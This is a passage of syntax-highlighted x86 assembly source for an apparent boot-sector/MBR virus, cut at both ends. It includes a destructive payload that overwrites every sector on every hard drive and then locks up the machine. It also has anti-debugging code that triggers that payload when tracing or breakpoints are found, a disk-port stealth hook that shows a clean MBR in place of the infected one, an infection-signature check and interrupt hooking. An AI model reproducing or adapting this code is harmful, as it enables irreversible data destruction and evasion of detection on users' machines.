                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; drive/head</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100000b</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                   </span><span class="sc1">; Set correct drive (C:/D:).</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Convert to I/O-command.</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Wait_IO_Ready</span><span class="sc0">

</span><span class="sc5">Read_In_Buffer</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">                </span><span class="sc1">; Data-register.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">                  </span><span class="sc1">; Was it a read or a write?</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">

                </span><span class="sc6">JP</span><span class="sc0">      </span><span class="sc5">Write_IO</span><span class="sc0">

</span><span class="sc5">Read_IO</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">INSW</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">Write_IO</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">OUTSW</span><span class="sc0">

</span><span class="sc5">Exit_Dispatch</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Wait_IO_Ready</span><span class="sc0">

                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001000b</span><span class="sc0">           </span><span class="sc1">; Buffer requires servicing?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Read_In_Buffer</span><span class="sc0">          </span><span class="sc1">; (more sectors to read).</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">New_Int01h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">          </span><span class="sc1">; CS of next instruction.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">                </span><span class="sc1">; We're in ROM ?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Exit_Int01h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">              </span><span class="sc1">; Skip HMA.</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Exit_Int01h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Traced_Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">          </span><span class="sc1">; IP of next instruction.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Traced_Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc1">; Kill TF.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

</span><span class="sc5">Exit_Int01h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">

                </span><span class="sc6">IRET</span><span class="sc0">


</span><span class="sc5">Anti_Debug</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Flip state keyboard-lock.</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                </span><span class="sc1">; We're being traced?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Payload</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+(</span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">         </span><span class="sc1">; Return-address.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">  </span><span class="sc1">; It's a debug breakpoint?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Payload</span><span class="sc0">

                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">End_Encrypted</span><span class="sc4">:</span><span class="sc0">


                </span><span class="sc9">ORG</span><span class="sc0">    </span><span class="sc2">1EEh</span><span class="sc0">                     </span><span class="sc1">; 4th partition data-block.</span><span class="sc0">

                </span><span class="sc1">; Recursive partition.</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">013Fh</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">510</span><span class="sc0">

                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0AA55h</span><span class="sc0">


</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Max_Tracks</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Max_Heads</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Sector_Count</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; Hail my powerful 486 :)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

</span><span class="sc5">Trash_Drive</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc0">                      </span><span class="sc1">; We've did all drives?</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">                       </span><span class="sc1">; Then just jam the system.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Heads</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Trash_Head</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc0">                      </span><span class="sc1">; We've did all heads?</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Trash_Drive</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Max_Tracks</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Trash_Track</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">                  </span><span class="sc1">; We've did all tracks?</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Trash_Head</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">                 </span><span class="sc1">; Reset harddrive.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0300h</span><span class="sc0">               </span><span class="sc1">; Smash all track-sectors.</span><span class="sc0">
</span><span class="sc5">Sector_Count</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Dispatcher</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Trash_Track</span><span class="sc0">


</span><span class="sc5">New_Int76h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">                       </span><span class="sc1">; Do-not-stealth switch.</span><span class="sc0">
</span><span class="sc5">Port_Stealth_Sw</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F3h</span><span class="sc0">                </span><span class="sc1">; Get sector-number.</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; They read the MBR ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exit_Int76h</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Get track-number low.</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F5h</span><span class="sc0">                </span><span class="sc1">; Get track-number high.</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Track 0 ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Int76h</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Get drive &amp; head.</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">           </span><span class="sc1">; They read from track 0 ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Exit_Int76h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">       </span><span class="sc1">; Read in the read sector.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">INSW</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CL = 01h.</span><span class="sc0">

                </span><span class="sc1">; Is it actually infected?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+(</span><span class="sc5">Signature</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)-</span><span class="sc2">512</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0730h</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Re_Read_Clean</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+(</span><span class="sc5">Home_TS</span><span class="sc4">-</span><span class="sc5">Virus_Begin</span><span class="sc4">)-</span><span class="sc2">512</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Re_Read_Clean</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">                </span><span class="sc1">; Read one sector.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Sector to read.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">                </span><span class="sc1">; Read with retry.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Wait_IO_Ready</span><span class="sc0">           </span><span class="sc1">; Wait till read is finished.</span><span class="sc0">

        </span><span class="sc1">; The original bootsector/MBR is not encrypted, since I</span><span class="sc0">
        </span><span class="sc1">; can't seem to put the sector back after decrypting it.</span><span class="sc0">

</span><span class="sc5">Exit_Int76h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Prev_Int76h</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; Returns CF when no Award-BIOS is present.</span><span class="sc0">
</span><span class="sc5">Check_For_Award</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0F000h</span><span class="sc0">                  </span><span class="sc1">; Standard ROM-BIOS segment.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

</span><span class="sc5">Scan_For_Award</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF00h</span><span class="sc0">              </span><span class="sc1">; Assume not found?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">No_Award_Found</span><span class="sc0">          </span><span class="sc1">; JA=JC.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Award_String</span><span class="sc0"> </span><span class="sc1">; Scan for 'Award'.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REPE</span><span class="sc0">    </span><span class="sc6">CMPSB</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Scan_For_Award</span><span class="sc0">

                </span><span class="sc6">CLC</span><span class="sc0">

</span><span class="sc5">No_Award_Found</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Award_String</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Award'</span><span class="sc0">


</span><span class="sc5">New_Int13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Int13h_AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">        </span><span class="sc1">; Save AH's value.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Run the original handler.</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc5">Prev_Int13h</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Return_Caller</span><span class="sc0">           </span><span class="sc1">; Skip our own stuff on fail.</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Initial value of AH.</span><span class="sc0">
</span><span class="sc5">Int13h_AH</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

